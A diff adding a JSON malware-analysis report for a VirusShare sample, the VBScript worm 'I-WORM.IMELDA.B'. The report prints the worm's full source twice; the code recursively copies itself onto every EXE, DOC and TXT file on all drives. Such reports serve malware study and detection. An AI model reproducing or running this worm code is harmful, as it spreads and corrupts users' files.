@@ -1,0 +1,77 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Call": "May call a DLL using Excel 4 Macros",
+            "Chr": "May attempt to obfuscate specific str",
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "'I-WORM.IMELDA.B\n'(C)2001, by Iwing\n'Virusindo - Indonesian Virus Network\n'http://indovirus.8m.com , IRC Dalnet #indovirus\n'===============================================\nSet FSO = CreateObject(\"scripting.filesystemobject\")\nCall CariDrive\nif day(now) = 12 then\nsh = msgbox(\"Hi there.., you are infected by some of\" & Chr(13) & \"IWING creations.., have a nice day\", 10 ,\"I-WORM.IMELDA.B \")\nend if\nFunction CariDrive()\nOn Error Resume Next\nSet DriveNya = FSO.Drives\nFor Each DriveKu In DriveNya\nMyPath = DriveKu & \"\\\"\nCall CariFile(MyPath)\nNext\nEnd Function\nFunction CariFile(TempatNya)\nFileNya = TempatNya\nSet FolderNya = FSO.GetFolder(FileNya)\nSet FileDiFolder = FolderNya.Files\nFor Each Traget In FileDiFolder\nIf FSO.GetExtensionName(Traget.Path) = \"EXE\" Then\nFSO.CopyFile wscript.scriptfullname, Traget.Path & \".vbs\", True\nEnd If\nIf FSO.GetExtensionName(Traget.Path) = \"DOC\" Then\nFSO.CopyFile wscript.scriptfullname, Traget.Path & \".vbs\", True\nEnd If\nIf FSO.GetExtensionName(Traget.Path) = \"TXT\" Then\nFSO.CopyFile wscript.scriptfullname, Traget.Path & \".vbs\", True\nEnd If\nNext\nSet SubNya = FolderNya.Subfolders\nFor Each Subku In SubNya\nCall CariFile(Subku.Path)\nNext\nEnd Function"
+    },
+    "filename": "VirusShare_a233033bcfd2dc7aa1be4b41eb6af33b",
+    "filesize": 1224,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "a233033bcfd2dc7aa1be4b41eb6af33b",
+        "sha1": "f684b5990c03c69919a02229ea9c922eb3889fd8",
+        "sha256": "2ab536482f93f5f99bd8d3a857ffcd1be08abaf202c7fb7b71b35d5f49c38520"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'I-WORM.IMELDA.B",
+            "'(C)2001, by Iwing",
+            "'Virusindo - Indonesian Virus Network",
+            "'http://indovirus.8m.com , IRC Dalnet #indovirus",
+            "'===============================================",
+            "Set FSO = CreateObject(\"scripting.filesystemobject\")",
+            "Call CariDrive",
+            "if day(now) = 12 then",
+            "sh = msgbox(\"Hi there.., you are infected by some of\" & Chr(13) & _",
+            "\"IWING creations.., have a nice day\", 10 ,\"I-WORM.IMELDA.B \")",
+            "end if",
+            "Function CariDrive()",
+            "On Error Resume Next",
+            "Set DriveNya = FSO.Drives",
+            "For Each DriveKu In DriveNya",
+            "MyPath = DriveKu & \"\\\"",
+            "Call CariFile(MyPath)",
+            "Next",
+            "End Function",
+            "Function CariFile(TempatNya)",
+            "FileNya = TempatNya",
+            "Set FolderNya = FSO.GetFolder(FileNya)",
+            "Set FileDiFolder = FolderNya.Files",
+            "For Each Traget In FileDiFolder",
+            "If FSO.GetExtensionName(Traget.Path) = \"EXE\" Then",
+            "FSO.CopyFile wscript.scriptfullname, Traget.Path & \".vbs\", True",
+            "End If",
+            "If FSO.GetExtensionName(Traget.Path) = \"DOC\" Then",
+            "FSO.CopyFile wscript.scriptfullname, Traget.Path & \".vbs\", True",
+            "End If",
+            "If FSO.GetExtensionName(Traget.Path) = \"TXT\" Then",
+            "FSO.CopyFile wscript.scriptfullname, Traget.Path & \".vbs\", True",
+            "End If",
+            "Next",
+            "Set SubNya = FolderNya.Subfolders",
+            "For Each Subku In SubNya",
+            "Call CariFile(Subku.Path)",
+            "Next",
+            "End Function"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://indovirus.8m.com"
+        ]
+    },
+    "time": "0:00:00.279348",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
